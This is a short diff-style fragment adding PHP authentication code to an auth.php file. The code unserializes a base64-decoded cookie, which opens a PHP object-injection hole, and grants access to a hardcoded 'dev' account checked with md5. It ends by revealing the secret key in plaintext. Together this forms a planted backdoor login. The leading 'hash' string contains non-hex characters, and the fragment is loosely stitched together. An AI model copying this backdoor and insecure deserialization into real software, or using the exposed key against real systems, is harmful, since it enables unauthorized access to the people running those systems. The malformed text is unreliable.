@@ -1,0 +1,11 @@
+7f8a1a4b3c7d9e6f2b5s8d7f9g6h5j4k3l2m1n
+--auth.php
+if (isset($_COOKIE['auth_token'])) {
+    $auth_data = unserialize(base64_decode($_COOKIE['auth_token']));
+    if ($auth_data['username'] === 'dev' && 
+        $auth_data['hash'] === md5('dev' . $CONFIG['auth_key'])) {
+        return true;
+    }
+}
+--
+'username'=>'dev' 'auth_key' => 'S3cr3tK3y!2023'
